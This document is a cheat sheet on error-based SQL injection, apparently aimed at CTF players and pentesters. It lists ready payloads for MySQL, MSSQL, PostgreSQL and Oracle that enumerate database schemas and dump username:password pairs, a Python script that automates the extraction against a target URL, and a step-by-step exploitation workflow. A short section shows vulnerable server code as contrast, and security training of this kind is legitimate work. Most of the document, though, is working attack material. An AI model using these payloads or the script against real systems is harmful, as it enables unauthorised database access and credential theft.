# SQL Injection — Error-Based

---

## Quick Reference

| Database | Function | Template |
|----------|----------|----------|
| MySQL / MariaDB | `extractvalue()` | `' AND extractvalue(1,concat(0x7e,(QUERY),0x7e))--` |
| MySQL / MariaDB | `updatexml()` | `' AND updatexml(1,concat(0x7e,(QUERY),0x7e),1)--` |
| MySQL / MariaDB | `exp()` overflow | `' AND exp(~(SELECT * FROM (QUERY)x))--` |
| MSSQL | `CAST()` | `' AND 1=CAST((QUERY) AS int)--` |
| MSSQL | `CONVERT()` | `' AND 1=CONVERT(int,(QUERY))--` |
| PostgreSQL | `CAST()` | `' AND 1=CAST((QUERY) AS int)--` |
| Oracle | `CTXSYS` | `' AND CTXSYS.DRITHSX.SN(1,(QUERY))=1--` |
| Oracle | `UTL_INADDR` | `' AND UTL_INADDR.GET_HOST_NAME((QUERY))=1--` |

```sql
-- MySQL full chain with extractvalue()
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))--
```

---

## What is Error-Based SQLi? 🔓

Error-based injection forces the database to throw an error that **includes the queried data inside the error message itself**. The app displays that error back in the HTTP response — and your extracted value appears on the page in plain sight.

**Impact:**
- 🔴 Full data extraction — DB name, tables, columns, credentials, flags
- 🔴 Faster than blind — each request returns a visible value, no guessing
- 🔴 Works wherever verbose database errors are reflected in the response
- ⚠️ Requires error messages to be visible — if suppressed, switch to blind or UNION

**The core idea:**

```sql
-- Normal query returns a product
SELECT * FROM products WHERE id = '1'

-- Error-based injection — the DB error message leaks your data:
SELECT * FROM products WHERE id = '1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--

-- Error response:
-- XPATH syntax error: '~shop_db~'
--                      ↑ database name leaked inside the error
```

---

## Detecting Error-Based Injection

Confirm that the app reflects database errors before attempting extraction.

**Step 1 — Trigger a basic syntax error:**

```sql
'
"
' AND 1=1--    ← normal
' AND 1=2--    ← no change = may not be boolean-visible; check for errors
```

**Step 2 — Trigger a type conversion error:**

```sql
' AND 1=CAST('a' AS int)--         -- MSSQL / PostgreSQL
' AND 1=CONVERT(int,'a')--         -- MSSQL
' AND extractvalue(1,0x7e)--       -- MySQL / MariaDB
' AND 1=(SELECT 1 FROM dual WHERE 1=utl_inaddr.get_host_name('x'))-- -- Oracle
```

**Step 3 — Read the response:**
- Sees `"Conversion failed when converting..."` → MSSQL error-based ✅
- Sees `"XPATH syntax error..."` → MySQL extractvalue/updatexml ✅
- Sees `"invalid input syntax for integer..."` → PostgreSQL CAST ✅
- Sees generic `"An error occurred"` → errors suppressed, use blind instead ❌

---

## MySQL / MariaDB Error-Based

### extractvalue()

Triggers an XPATH error that embeds your query result in the message. **Most common MySQL error-based technique.**

```sql
-- DB name
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--

-- DB version
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--

-- Current user
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--

-- All tables (grouped)
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--

-- All columns in a table
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--

-- First row of data
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))--

-- Second row
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1,1),0x7e))--
```

⚠️ `extractvalue()` is capped at **32 characters** per call. Use `SUBSTRING()` for longer values (see Advanced Variations).

### updatexml()

Same XPATH error mechanism, slightly different syntax. Use as a fallback if `extractvalue()` is filtered.

```sql
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e),1)--
```

### FLOOR() + RAND() — no function filter fallback

Works when `extractvalue` and `updatexml` are both blocked. Triggers a `Duplicate entry` error with the data embedded.

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--

-- Extract credentials:
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

### exp() overflow

Works on older MySQL versions. Triggers a `DOUBLE value is out of range` error.

```sql
' AND exp(~(SELECT * FROM (SELECT database())x))--
' AND exp(~(SELECT * FROM (SELECT user())x))--
' AND exp(~(SELECT * FROM (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1)x))--
```

---

## MSSQL Error-Based

MSSQL is the most error-verbose database. Type conversion errors leak data cleanly into the error message.

**CAST() — primary method:**

```sql
-- DB name
' AND 1=CAST((SELECT DB_NAME()) AS int)--

-- Version
' AND 1=CAST((SELECT @@version) AS int)--

-- All databases
' AND 1=CAST((SELECT name FROM sys.databases) AS int)--

-- First username
' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--

-- Credentials concatenated
' AND 1=CAST((SELECT TOP 1 username+':'+password FROM users) AS int)--
```

**CONVERT() — alternative:**

```sql
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
' AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))--
```

**Multiple rows with FOR XML PATH:**

```sql
-- Dump all credentials in one error
' AND 1=CAST((SELECT username+':'+password+' ' FROM users FOR XML PATH('')) AS int)--
```

---

## PostgreSQL Error-Based

PostgreSQL's `CAST()` to integer leaks the value in the error message identically to MSSQL.

```sql
-- DB name
' AND 1=CAST((SELECT current_database()) AS int)--

-- Version
' AND 1=CAST((SELECT version()) AS int)--

-- Tables
' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--

-- All credentials in one call
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--
```

---

## Oracle Error-Based

Oracle requires specific built-in functions to leak data through errors. These require certain privileges — `CTXSYS` is most reliable in CTFs.

**CTXSYS.DRITHSX.SN() — most common:**

```sql
' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))=1--
' AND CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE rownum=1))=1--
' AND CTXSYS.DRITHSX.SN(1,(SELECT username||':'||password FROM users WHERE rownum=1))=1--
```

**UTL_INADDR.GET_HOST_NAME() — alternative:**

```sql
' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))=1--
' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))=1--
```

**DBMS_XDB_VERSION.CHECKIN() — second fallback:**

```sql
' AND DBMS_XDB_VERSION.CHECKIN((SELECT user FROM dual))=1--
' AND DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE rownum=1))=1--
```

⚠️ Oracle CTF challenges are less common. If `CTXSYS` errors with `insufficient privileges`, try `UTL_INADDR` or switch to UNION-based.

---

## Advanced Variations

**Bypass the 32-character limit (MySQL `extractvalue` / `updatexml`):**

```sql
-- Chars 1–30
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 0,1),1,30),0x7e))--

-- Chars 31–60
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 0,1),31,30),0x7e))--

-- See the tail using REVERSE (useful for hashes)
' AND extractvalue(1,concat(0x7e,REVERSE((SELECT password FROM users LIMIT 0,1)),0x7e))--
```

**Dump all rows at once with GROUP_CONCAT:**

```sql
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,':',password SEPARATOR ' | ') FROM users),0x7e))--
```

⚠️ `GROUP_CONCAT` output also hits the 32-char limit — use it only when row data is short (like CTF flags).

**CTF common flag targets — try these first:**

```sql
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 0,1),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flag),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT secret FROM secrets LIMIT 0,1),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM admin LIMIT 0,1),0x7e))--
```

**MSSQL stacked error — when AND is filtered:**

```sql
'; DECLARE @x int; SET @x=CAST((SELECT TOP 1 password FROM users) AS int)--
```

---

## Automation with Python

```python
import requests
import re

url = "http://target.com/page?id=1"

def extract(query):
    payload = f"' AND extractvalue(1,concat(0x7e,({query}),0x7e))--"
    r = requests.get(url + payload)
    match = re.search(r'~([^~]+)~', r.text)
    return match.group(1) if match else None

def extract_long(query, chunk=30):
    """Handle 32-char limit by chunking with SUBSTRING."""
    result = ""
    pos = 1
    while True:
        chunk_query = f"SELECT SUBSTRING(({query}),{pos},{chunk})"
        part = extract(chunk_query)
        if not part:
            break
        result += part
        if len(part) < chunk:
            break
        pos += chunk
    return result

# Quick chain
print("DB:     ", extract("SELECT database()"))
print("Tables: ", extract("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"))
print("Cols:   ", extract("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'"))
print("Creds:  ", extract_long("SELECT CONCAT(username,':',password) FROM users LIMIT 0,1"))
print("Flag:   ", extract("SELECT flag FROM flags LIMIT 0,1"))
```

---

## Exploitation Workflow

1. **Trigger a syntax error** — `'` alone; check if a detailed DB error appears in the response
2. **Confirm error reflection** — inject a type conversion error (`CAST('a' AS int)`) and verify it shows in the page
3. **Fingerprint the database** — error message style reveals the engine (XPATH = MySQL, "Conversion failed" = MSSQL, "invalid input syntax" = PostgreSQL)
4. **Extract DB name** — use `database()` / `DB_NAME()` / `current_database()` via the matching function
5. **List tables** — `GROUP_CONCAT(table_name)` from `information_schema.tables`
6. **List columns** — `GROUP_CONCAT(column_name)` from `information_schema.columns`
7. **Dump target data** — `CONCAT(username,':',password)` with `LIMIT` to paginate rows
8. **Handle 32-char limit** — chunk with `SUBSTRING(value, 1, 30)` then `SUBSTRING(value, 31, 30)`
9. **Automate if many rows** — Python script looping `LIMIT N,1` per row

---

## Common Vulnerable Patterns

**Verbose error displayed directly:**

```python
# ❌ Vulnerable — raw DB exception shown to user
try:
    cursor.execute(f"SELECT * FROM products WHERE id = '{user_id}'")
except Exception as e:
    return f"Database error: {e}"   # ← error message contains injected query result
```

**Error logged AND reflected in UI:**

```php
// ❌ Vulnerable — error details returned in JSON response
try {
    $result = $pdo->query("SELECT * FROM users WHERE id='$id'");
} catch (PDOException $e) {
    echo json_encode(['error' => $e->getMessage()]);  // ← message leaks data
}
```

**Debug mode left on in production:**

```javascript
// ❌ Vulnerable — Express error handler exposes stack/query
app.use((err, req, res, next) => {
    res.status(500).json({ message: err.message, stack: err.stack });
    // ← stack trace may include the raw SQL with injected content
});
```

**Hidden in HTTP headers or source comments:**

```html
<!-- ❌ Sometimes errors end up in HTML comments or X-Debug headers -->
<!-- DB Error: XPATH syntax error: '~admin_password_hash~' -->
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```sql
' AND extractvalue(1,0x7e)--          -- does MySQL XPATH error appear?
' AND 1=CAST('x' AS int)--            -- does MSSQL/PG type error appear?
' AND CTXSYS.DRITHSX.SN(1,'x')=1--   -- does Oracle function error appear?
```

**Speed tips:**
- ✅ Always try `extractvalue` + `GROUP_CONCAT` first — dumps tables and columns in a single request
- ✅ `0x7e` (`~`) as delimiter makes parsing the error trivial — look for `~value~` in the response
- ✅ For CTF flags: skip enumeration and guess `flag`, `flags`, `secret`, `key` as table names first
- ✅ MSSQL `CAST()` has no 32-char limit — dump entire strings in one shot
- ⚠️ MySQL `extractvalue` and `updatexml` cap at 32 chars — always chunk long values
- ⚠️ If errors appear but contain no data, the app may be catching exceptions before your function fires — try `FLOOR(RAND()*2)` technique instead

**Common CTF scenarios:**
- **XPATH syntax error visible** → MySQL `extractvalue()` chain, go fast
- **"Conversion failed" or "invalid syntax for int"** → MSSQL/PostgreSQL `CAST()`, no length limit
- **Errors hidden, only status changes** → switch to blind boolean/time-based
- **32-char output truncated** → chunk with `SUBSTRING(val,1,30)` then `SUBSTRING(val,31,30)`
- **Flag is a hash (32–64 chars)** → use `REVERSE()` trick to see both halves, or chunk

---

## Key Takeaways

- ✅ Error-based is the fastest manual extraction technique — one request = one visible value
- ✅ MySQL uses `extractvalue()` / `updatexml()` (XPATH errors); MSSQL/PostgreSQL use `CAST() AS int`
- ✅ `0x7e` (`~`) as a delimiter wraps your output clearly in the error message
- ✅ `extractvalue` and `updatexml` are limited to 32 chars — use `SUBSTRING()` chunks for longer data
- ✅ `GROUP_CONCAT` collapses all table/column names into one error — use it for fast enumeration
- ✅ If errors are suppressed entirely, error-based is dead — pivot to UNION or blind